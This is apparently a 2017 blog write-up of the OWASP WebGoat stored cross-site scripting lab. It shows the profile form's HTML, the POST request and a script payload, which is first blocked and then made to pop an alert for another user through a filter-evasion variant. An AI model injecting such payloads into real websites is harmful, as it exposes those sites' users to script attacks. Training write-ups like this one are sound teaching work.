---
layout: post
title:  "OWASP BWA WebGoat Challenge Part 8 (Continued)"
date:   2017-01-26 13:00:00 -0500
categories: webgoat
---
# Cross Site Scripting Lab: Stored XSS
Instructions:

- As 'Tom', execute a Stored XSS attack against the Street field on the Edit Profile page. Verify that 'Jerry' is affected by the attack.
- The passwords for the accounts are the lower-case versions of their given names (e.g. the password for Tom Cat is "tom").

A full lab section on XSS! Let's start off by looking at what a stored XSS attack is. 

< info about a stored XSS attack here >

From OWASPs page on [Testing for Stored XSS][stored-xss], a stored XSS attack generally follows these major steps:

- Attacker stores malicious code into the vulnerable page
- User authenticates in the application
- User visits vulnerable page
- Malicious code is executed by the user's browser

Let's navigate our way to the ```EditProfile``` page and see what we have going on.

<img src="{{ site.baseurl }}/images/2017-01-26-webgoat_part_8_continued/edit-profile.jpg">

Alright, let's see how our input is handled for the 'Street' field:

```
<input class="lesson_text_db" name="address1" value="2211 HyperThread Rd." type="text">
```

Okay, so if we edit that field and press ```UpdateProfile```, we send the following request:

```
firstName=Tom&lastName=Cat&address1=test&address2=New+York%2C+NY&phoneNumber=443-599-0762&startDate=1011999&ssn=792-14-6364&salary=80000&ccn=5481360857968521&ccnLimit=30000&description=Co-Owner.&manager=105&disciplinaryNotes=NA&disciplinaryDate=0&employee_id=105&title=Engineer&action=UpdateProfile
```

and get this page:

<img src="{{ site.baseurl }}/images/2017-01-26-webgoat_part_8_continued/edited-profile.jpg">

Our field for 'Street' now looks like this on ```ViewProfile```:

```
<td>Street: </td><td>test</td>
```

Well, lets see what happens when we try an alert. First, we ```UpdateProfile``` with our script:

```
firstName=Tom&lastName=Cat&address1=<script>'javascript:alert(`XSS`)';</script>&address2=New+York%2C+NY&phoneNumber=443-599-0762&startDate=1011999&ssn=792-14-6364&salary=80000&ccn=5481360857968521&ccnLimit=30000&description=Co-Owner.&manager=105&disciplinaryNotes=NA&disciplinaryDate=0&employee_id=105&title=Engineer&action=UpdateProfile
```

Annnnd......

<img src="{{ site.baseurl }}/images/2017-01-26-webgoat_part_8_continued/tom-failed-alert-xss.jpg">

Huh. Okay, well let's try some other variations of the alert pop (via [OWASPs XSS Filter Evasion Cheat Sheet][filter-evasion]. For example, let's remove the quotations from around the ```javascript:alert()``` call:

```
<script>javascript:alert(`XSS`);</script>
```

<img src="{{ site.baseurl }}/images/2017-01-26-webgoat_part_8_continued/tom-alert-xss.jpg">


Alright! Nice. So now that our alert is inserted into the webserver's data for Tom's ```Street``` field, let's see if Jerry sees what we see. We log into Jerry's account, and view Tom's profile:

<img src="{{ site.baseurl }}/images/2017-01-26-webgoat_part_8_continued/jerry-alert-xss.jpg">

Got 'em!



### Resources

1 [OWASP Stored XSS][stored-xss]

2 [OWASP XSS Filter Evasion][filter-evasion]

[stored-xss]:https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)
[filter-evasion]:https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#TD